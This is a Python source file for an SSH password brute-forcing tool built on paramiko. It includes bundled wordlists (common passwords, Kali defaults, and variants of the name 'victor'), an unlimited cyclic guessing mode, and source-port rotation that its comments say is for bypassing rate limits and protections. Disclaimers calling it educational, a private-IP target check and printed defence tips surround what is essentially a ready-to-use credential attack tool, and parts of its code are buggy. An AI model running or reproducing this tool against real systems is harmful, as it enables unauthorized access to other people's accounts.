#!/usr/bin/env python3
"""
Advanced SSH Attack Tool
WARNING: For use only in your own laboratory environment!

Author: Educational material for cybersecurity learning
License: Educational purposes only
"""

import paramiko
import sys
import time
import threading
import argparse
import socket
import random
import itertools
from concurrent.futures import ThreadPoolExecutor, as_completed

class AdvancedSSHAttack:
    """
    Advanced tool for demonstrating SSH attacks
    """
    
    def __init__(self, target_ip, target_port=22):
        self.target_ip = target_ip
        self.target_port = target_port
        self.found_credentials = []
        self.attempts = 0
        self.max_attempts = 1000
        self.timeout = 10
        self.delay_between_attempts = 0.5  # Delay between attempts
        self.source_ports = []  # List of ports for connection
        self.current_source_port_index = 0
        self.unlimited_attempts = False  # Unlimited attempts mode
        self.port_rotation_enabled = True  # Port rotation
        
        # Security check
        if not self._is_safe_target(target_ip):
            print("❌ ERROR: SSH attacks are only allowed for local networks!")
            sys.exit(1)
    
    def _is_safe_target(self, ip):
        """Security target check"""
        safe_prefixes = ['127.', '192.168.', '10.']
        
        if ip.startswith('172.'):
            try:
                second_octet = int(ip.split('.')[1])
                return 16 <= second_octet <= 31
            except:
                return False
        
        return any(ip.startswith(prefix) for prefix in safe_prefixes)
    
    def generate_source_ports(self, count=100):
        """
        Generate random ports for connection (bypass limits)
        """
        # Port range for client connections
        min_port = 1024
        max_port = 65535
        
        # Generate random ports
        ports = []
        for _ in range(count):
            port = random.randint(min_port, max_port)
            if port not in ports:
                ports.append(port)
        
        self.source_ports = ports
        print(f"✅ Generated {len(ports)} ports for connection")
        return ports
    
    def get_next_source_port(self):
        """
        Get next port for connection
        """
        if not self.source_ports:
            self.generate_source_ports()
        
        port = self.source_ports[self.current_source_port_index % len(self.source_ports)]
        self.current_port_index += 1
        
        # If port rotation is enabled, generate new ports
        if self.port_rotation_enabled and self.current_port_index >= len(self.source_ports):
            print("🔄 Port rotation: generating new ports...")
            self.generate_source_ports()
            self.current_port_index = 0
        
        return port
    
    def generate_unlimited_ports(self):
        """
        Generate unlimited number of ports
        """
        print("♾️  Unlimited ports mode enabled")
        self.port_rotation_enabled = True
        self.unlimited_attempts = True
        self.max_attempts = float('inf')  # Unlimited attempts
        self.generate_source_ports(1000)  # Generate more ports
    
    def load_github_passwords(self):
        """
        Load popular passwords from GitHub (top-1000)
        """
        passwords = [
            # Top-50 most popular passwords
            '123456', 'password', '123456789', '12345678', '12345',
            '1234567', '1234567890', 'qwerty', 'abc123', '111111',
            '123123', 'admin', 'letmein', 'welcome', 'monkey',
            '1234', 'dragon', 'password123', 'master', 'hello',
            'freedom', 'whatever', 'qazwsx', 'trustno1', '654321',
            'jordan23', 'harley', 'password1', '123qwe', 'robert',
            'matthew', 'jordan', 'asshole', 'daniel', 'andrew',
            'joshua', 'michael', 'charlie', 'michelle', 'jessica',
            'amanda', 'samantha', 'ashley', 'jennifer', 'joshua',
            'robert', 'daniel', 'matthew', 'jordan', 'andrew',
            
            # Kali Linux specific passwords
            'kali', 'toor', 'kali123', 'toor123', 'kali2024',
            'kali2023', 'kali2022', 'kali2021', 'kali2020',
            'kalilinux', 'kalilinux123', 'kalilinux2024',
            'root', 'root123', 'root2024', 'root2023',
            'admin', 'admin123', 'admin2024', 'admin2023',
            
            # Victor specific passwords
            'victor', 'victor123', 'victor2024', 'victor2023',
            'Victor', 'Victor123', 'Victor2024', 'Victor2023',
            'VICTOR', 'VICTOR123', 'VICTOR2024', 'VICTOR2023',
            
            # Simple combinations
            '123', '1234', '12345', '123456', '1234567',
            'password', 'Password', 'PASSWORD', 'password1',
            'Password1', 'PASSWORD1', 'password123', 'Password123',
            'PASSWORD123', 'pass', 'Pass', 'PASS', 'pass123',
            'Pass123', 'PASS123', 'test', 'Test', 'TEST',
            'test123', 'Test123', 'TEST123', 'user', 'User',
            'USER', 'user123', 'User123', 'USER123',
            
            # Special symbols
            'password!', 'Password!', 'PASSWORD!', 'password@',
            'Password@', 'PASSWORD@', 'password#', 'Password#',
            'PASSWORD#', 'password$', 'Password$', 'PASSWORD$',
            'password%', 'Password%', 'PASSWORD%', 'password^',
            'Password^', 'PASSWORD^', 'password&', 'Password&',
            'PASSWORD&', 'password*', 'Password*', 'PASSWORD*',
            
            # Empty and minimal
            '', '1', '12', '123', '1234', '12345',
            'a', 'aa', 'aaa', 'aaaa', 'aaaaa',
            'q', 'qq', 'qqq', 'qqqq', 'qqqqq',
            'z', 'zz', 'zzz', 'zzzz', 'zzzzz',
            
            # Years
            '2024', '2023', '2022', '2021', '2020',
            '2019', '2018', '2017', '2016', '2015',
            
            # Combined
            'admin2024', 'root2024', 'kali2024', 'victor2024',
            'admin123', 'root123', 'kali123', 'victor123',
            'admin!', 'root!', 'kali!', 'victor!',
            'admin@', 'root@', 'kali@', 'victor@',
            'admin#', 'root#', 'kali#', 'victor#',
            
            # Additional popular
            'welcome', 'Welcome', 'WELCOME', 'welcome123',
            'Welcome123', 'WELCOME123', 'hello', 'Hello',
            'HELLO', 'hello123', 'Hello123', 'HELLO123',
            'world', 'World', 'WORLD', 'world123',
            'World123', 'WORLD123', 'love', 'Love',
            'LOVE', 'love123', 'Love123', 'LOVE123',
            'hacker', 'Hacker', 'HACKER', 'hacker123',
            'Hacker123', 'HACKER123', 'security', 'Security',
            'SECURITY', 'security123', 'Security123', 'SECURITY123',
            
            # Russian passwords (transliteration)
            'пароль', 'password', 'admin', 'root', 'kali',
            'victor', 'пользователь', 'user', 'тест', 'test',
            'демо', 'demo', 'гость', 'guest', 'хакер', 'hacker',
            
            # Additional combinations
            'qwerty', 'QWERTY', 'Qwerty', 'qwerty123',
            'QWERTY123', 'Qwerty123', 'asdfgh', 'ASDFGH',
            'Asdfgh', 'asdfgh123', 'ASDFGH123', 'Asdfgh123',
            'zxcvbn', 'ZXCVBN', 'Zxcvbn', 'zxcvbn123',
            'ZXCVBN123', 'Zxcvbn123', '1qaz2wsx', '1QAZ2WSX',
            '1qaz2wsx123', '1QAZ2WSX123'
        ]
        
        print(f"✅ Loaded {len(passwords)} popular passwords from GitHub")
        return passwords
    
    def test_ssh_connection(self, username, password, use_random_port=True):
        """
        Test SSH connection with given credentials
        """
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Configure source port for bypassing limits
            if use_random_port and self.source_ports:
                try:
                    source_port = self.get_next_source_port()
                    # Create socket with binding to specific port
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    sock.bind(('', source_port))
                    
                    ssh.connect(
                        self.target_ip,
                        port=self.target_port,
                        username=username,
                        password=password,
                        timeout=self.timeout,
                        allow_agent=False,
                        look_for_keys=False,
                        sock=sock
                    )
                    sock.close()
                except (OSError, socket.error) as e:
                    # If can't bind to port, use regular connection
                    ssh.connect(
                        self.target_ip,
                        port=self.target_port,
                        username=username,
                        password=password,
                        timeout=self.timeout,
                        allow_agent=False,
                        look_for_keys=False
                    )
            else:
                # Regular connection without port binding
                ssh.connect(
                    self.target_ip,
                    port=self.target_port,
                    username=username,
                    password=password,
                    timeout=self.timeout,
                    allow_agent=False,
                    look_for_keys=False
                )
            
            # If we got here, connection is successful
            ssh.close()
            return True
            
        except paramiko.AuthenticationException:
            return False
        except paramiko.SSHException as e:
            if "Authentication failed" in str(e) or "No existing session" in str(e):
                return False
            else:
                print(f"⚠️  SSH error: {e}")
                return False
        except (OSError, socket.error) as e:
            # Ignore socket errors
            return False
        except Exception as e:
            print(f"⚠️  Connection error: {e}")
            return False
    
    def brute_force_worker(self, username, password):
        """
        Worker thread for brute force attack
        """
        if self.attempts >= self.max_attempts:
            return None
        
        self.attempts += 1
        
        # Add delay to bypass protection
        time.sleep(self.delay_between_attempts)
        
        if self.attempts % 5 == 0:
            print(f"📊 Attempt {self.attempts}: {username}:{password}")
        
        if self.test_ssh_connection(username, password):
            print(f"🎉 SUCCESS! Found password: {username}:{password}")
            self.found_credentials.append((username, password))
            return (username, password)
        
        return None
    
    def brute_force_unlimited(self, username, password_list):
        """
        Unlimited brute force attack with cyclic password enumeration
        """
        print(f"♾️  Unlimited SSH Brute Force attack on {self.target_ip}:{self.target_port}")
        print(f"👤 User: {username}")
        print(f"📁 Password dictionary: {len(password_list)} passwords")
        print(f"🔄 Mode: Cyclic password enumeration")
        print(f"🔀 Port rotation: {'Enabled' if self.port_rotation_enabled else 'Disabled'}")
        print(f"⏱️  Timeout: {self.timeout} seconds")
        print(f"⏳ Delay between attempts: {self.delay_between_attempts} sec")
        
        start_time = time.time()
        cycle_count = 0
        
        # Check SSH availability
        print("\n🔍 Checking SSH availability...")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            result = sock.connect_ex((self.target_ip, self.target_port))
            sock.close()
            
            if result != 0:
                print("❌ SSH unavailable on port 22")
                return False
            else:
                print("✅ SSH available")
        except Exception as e:
            print(f"⚠️  SSH check error: {e}")
        
        print(f"\n🚀 Starting unlimited brute force attack...")
        print("💡 Press Ctrl+C to stop")
        
        try:
            while True:
                cycle_count += 1
                print(f"\n🔄 Cycle {cycle_count}: Enumerating {len(password_list)} passwords...")
                
                for i, password in enumerate(password_list):
                    self.attempts += 1
                    
                    # Show progress every 10 attempts
                    if self.attempts % 10 == 0:
                        elapsed_time = time.time() - start_time
                        speed = self.attempts / elapsed_time if elapsed_time > 0 else 0
                        print(f"📊 Attempt {self.attempts}: {username}:{password} | Speed: {speed:.2f} attempts/sec")
                    
                    if self.test_ssh_connection(username, password):
                        print(f"🎉 SUCCESS! Found password: {username}:{password}")
                        self.found_credentials.append((username, password))
                        return True
                    
                    # Delay between attempts
                    time.sleep(self.delay_between_attempts)
                
                print(f"✅ Completed cycle {cycle_count}. Password not found, starting new cycle...")
                
                # Short pause between cycles
                time.sleep(2)
                
        except KeyboardInterrupt:
            print(f"\n🛑 Attack interrupted by user")
            return False
        except Exception as e:
            print(f"❌ Error: {e}")
            return False
        
        end_time = time.time()
        duration = end_time - start_time
        
        print(f"\n📊 Brute force results:")
        print(f"  • Execution time: {duration:.2f} seconds")
        print(f"  • Total attempts: {self.attempts}")
        print(f"  • Completed cycles: {cycle_count}")
        print(f"  • Speed: {self.attempts/duration:.2f} attempts/sec")
        
        if self.found_credentials:
            print(f"  • Found accounts: {len(self.found_credentials)}")
            for username, password in self.found_credentials:
                print(f"    🎉 {username}:{password}")
            return True
        else:
            print(f"  • Result: Password not found")
            return False
    
    def load_password_list(self, filename):
        """
        Load password list from file
        """
        try:
            with open(filename, 'r', encoding='utf-8') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(f"✅ Loaded {len(passwords)} passwords from {filename}")
            return passwords
        except Exception as e:
            print(f"❌ Error loading password file: {e}")
            return []
    
    def generate_common_passwords(self):
        """
        Generate list of common passwords
        """
        passwords = [
            # Basic passwords
            'password', '123456', 'admin', 'root', 'kali', 'test', 'hello',
            'password123', 'admin123', 'root123', 'kali123', 'test123',
            'Password', 'Admin', 'Root', 'Kali', 'Test',
            'P@ssw0rd', 'Adm1n', 'R00t', 'K@li', 'T3st',
            
            # Passwords with numbers
            '12345678', 'qwerty', 'abc123', 'password1', 'admin1',
            '123456789', '1234567890', 'password12', 'admin12',
            
            # Passwords with symbols
            'password!', 'admin!', 'root!', 'kali!', 'test!',
            'password@', 'admin@', 'root@', 'kali@', 'test@',
            'password#', 'admin#', 'root#', 'kali#', 'test#',
            
            # Combined passwords
            'pass123', 'admin123', 'root123', 'kali123', 'test123',
            '123pass', '123admin', '123root', '123kali', '123test',
            'pass!123', 'admin!123', 'root!123', 'kali!123', 'test!123',
            
            # Empty and simple passwords
            '', '123', '1234', '12345', '123456', '1234567',
            'a', 'aa', 'aaa', 'aaaa', 'aaaaa',
            '1', '11', '111', '1111', '11111',
        ]
        
        print(f"✅ Generated {len(passwords)} common passwords")
        return passwords
    
    def generate_victor_passwords(self):
        """
        Generate passwords based on Victor name
        """
        base_name = "victor"
        passwords = []
        
        # Basic variants
        passwords.extend([
            base_name,
            base_name.capitalize(),
            base_name.upper(),
            base_name.lower()
        ])
        
        # With numbers
        for i in range(10):
            passwords.extend([
                f"{base_name}{i}",
                f"{base_name.capitalize()}{i}",
                f"{base_name.upper()}{i}",
                f"{i}{base_name}",
                f"{i}{base_name.capitalize()}",
                f"{i}{base_name.upper()}"
            ])
        
        # With symbols
        symbols = ['!', '@', '#', '$', '%', '^', '&', '*', '+', '=', '-', '_', '.', ',', ';', ':', '?', '/', '|', '\\', '~', '`', '<', '>', '[', ']', '{', '}', '(', ')', '"', "'", ' ']
        for sym in symbols[:10]:  # Take only first 10 symbols
            passwords.extend([
                f"{base_name}{sym}",
                f"{base_name.capitalize()}{sym}",
                f"{base_name.upper()}{sym}",
                f"{sym}{base_name}",
                f"{sym}{base_name.capitalize()}",
                f"{sym}{base_name.upper()}"
            ])
        
        # Combined variants
        for i in range(5):
            for sym in symbols[:5]:
                passwords.extend([
                    f"{base_name}{i}{sym}",
                    f"{base_name.capitalize()}{i}{sym}",
                    f"{sym}{base_name}{i}",
                    f"{sym}{base_name.capitalize()}{i}"
                ])
        
        # Remove duplicates
        passwords = list(set(passwords))
        
        print(f"✅ Generated {len(passwords)} passwords based on Victor name")
        return passwords

def main():
    """
    Main function of advanced SSH attack tool
    """
    print("=" * 60)
    print("🔐 ADVANCED SSH ATTACK TOOL")
    print("=" * 60)
    print("⚠️  WARNING: For use only in your own laboratory!")
    print("⚠️  Using against other systems is ILLEGAL!")
    print("=" * 60)
    
    parser = argparse.ArgumentParser(description='Advanced SSH attack tool')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-u', '--username', default='victor', help='Username')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH port')
    parser.add_argument('-w', '--wordlist', help='Password dictionary file')
    parser.add_argument('-t', '--threads', type=int, default=3, help='Number of threads')
    parser.add_argument('-m', '--max-attempts', type=int, default=1000, help='Maximum attempts')
    parser.add_argument('--timeout', type=int, default=10, help='SSH connection timeout')
    parser.add_argument('--delay', type=float, default=0.5, help='Delay between attempts')
    parser.add_argument('--single-thread', action='store_true', help='Use single-threaded mode')
    parser.add_argument('--common-passwords', action='store_true', help='Use common passwords')
    parser.add_argument('--victor-passwords', action='store_true', help='Generate passwords based on Victor')
    parser.add_argument('--github-passwords', action='store_true', help='Use popular passwords from GitHub')
    parser.add_argument('--random-ports', action='store_true', help='Use random ports for connection')
    parser.add_argument('--port-count', type=int, default=100, help='Number of random ports to generate')
    parser.add_argument('--unlimited-attempts', action='store_true', help='Unlimited number of attempts (cyclic enumeration)')
    parser.add_argument('--port-rotation', action='store_true', help='Enable port rotation to bypass limits')
    parser.add_argument('--multi-user', action='store_true', help='Attack multiple users simultaneously')
    
    args = parser.parse_args()
    
    # Create tool instance
    ssh_attack = AdvancedSSHAttack(args.target, args.port)
    ssh_attack.max_attempts = args.max_attempts
    ssh_attack.timeout = args.timeout
    ssh_attack.delay_between_attempts = args.delay
    
    # Configure modes
    if args.unlimited_attempts:
        ssh_attack.generate_unlimited_ports()
        print(f"♾️  Unlimited attempts mode enabled")
    
    if args.random_ports or args.port_rotation:
        ssh_attack.generate_source_ports(args.port_count)
        ssh_attack.port_rotation_enabled = args.port_rotation
        print(f"🔀 Random ports mode enabled ({args.port_count} ports)")
        if args.port_rotation:
            print(f"🔄 Port rotation enabled")
    
    # Load passwords
    if args.github_passwords:
        passwords = ssh_attack.load_github_passwords()
    elif args.victor_passwords:
        passwords = ssh_attack.generate_victor_passwords()
    elif args.common_passwords:
        passwords = ssh_attack.generate_common_passwords()
    elif args.wordlist:
        passwords = ssh_attack.load_password_list(args.wordlist)
    else:
        # Use built-in list
        passwords = [
            'victor', 'Victor', 'VICTOR', 'victor123', 'Victor123', 'VICTOR123',
            'victor1', 'Victor1', 'VICTOR1', 'victor1234', 'Victor1234', 'VICTOR1234',
            'victor!', 'Victor!', 'VICTOR!', 'victor@', 'Victor@', 'VICTOR@',
            'password', '123456', 'admin', 'root', 'kali', 'test', 'hello',
            'password123', 'admin123', 'root123', 'kali123'
        ]
    
    if not passwords:
        print("❌ No passwords for testing")
        return
    
    try:
        # Run brute force
        if args.unlimited_attempts:
            success = ssh_attack.brute_force_unlimited(args.username, passwords)
        else:
            success = ssh_attack.brute_force_unlimited(args.username, passwords)
        
        if success:
            print("\n🎉 ATTACK SUCCESSFUL!")
            print("💡 Security recommendations:")
            print("  • Use strong passwords")
            print("  • Enable two-factor authentication")
            print("  • Configure fail2ban to block IPs")
            print("  • Use SSH keys instead of passwords")
            print("  • Limit login attempts")
        else:
            print("\n❌ ATTACK UNSUCCESSFUL")
            print("✅ System protected against brute force attacks")
            
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user")
    except Exception as e:
        print(f"❌ Error: {e}")
    
    print("\n📚 Educational information:")
    print("• SSH brute force - password enumeration for SSH")
    print("• Multithreading speeds up the attack")
    print("• Weak passwords are easily cracked")
    print("• Protection: strong passwords + fail2ban + 2FA")

if __name__ == "__main__":
    main()
